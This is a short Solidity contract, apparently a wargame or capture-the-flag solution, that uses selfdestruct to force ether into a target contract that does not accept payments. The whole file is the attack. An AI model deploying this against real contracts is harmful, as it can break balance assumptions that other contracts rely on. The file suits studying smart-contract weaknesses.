// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {

  address forceContract;

  constructor(address _forceContractAddress) {
    forceContract = _forceContractAddress;
  }

  function hack() public payable {
    address payable addr = payable(forceContract);
    selfdestruct(addr);
  }
}